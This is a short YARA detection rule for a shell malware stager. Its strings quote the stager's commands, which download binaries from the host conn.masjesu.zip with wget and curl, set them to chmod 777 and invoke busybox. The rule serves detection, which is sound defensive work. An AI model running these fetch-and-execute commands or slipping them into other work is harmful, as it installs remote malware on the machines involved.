rule MAL__SH_Stager_551d759edf7b3bb85f8e15e4ec18b68fbd2806ca78b0d0c06c487410de5d3825 {

	meta:
	author = "august"
	derscription = "SH STAGER  551d759edf7b3bb85f8e15e4ec18b68fbd2806ca78b0d0c06c487410de5d3825"
	
	strings:
	
		$a1 = "wget http://conn.masjesu.zip/bins/duZwkigPpaJ3uN7ugZYexOiTouauYGw3ZH"
		$a2 = "wget http://conn.masjesu.zip/bins/JbHGq0XeyeksenL6PoRhZooKvc4xDlcWph"
		$a3 = "chmod 777 duZwkigPpaJ3uN7ugZYexOiTouauYGw3ZH;"
		$a4 = "rm PtthzTjmGz6hiD8IdfUESj7v7l5UaXj5GM"
		$a5 = "curl -O  http://conn.masjesu.zip/bins/6Vt065JrwtiKTlzzojZHt3gYUH3tmpJMnA;/bin/busybox"
		$a6 = "wget http://conn.masjesu.zip/bins/Vcq16M8p4zPrCNcNCT7K8eX3WaRZYavDAk"
		
	condition:
	
		(2 of($a1, $a2, $a3, $a4, $a5, $a6))
		
	}
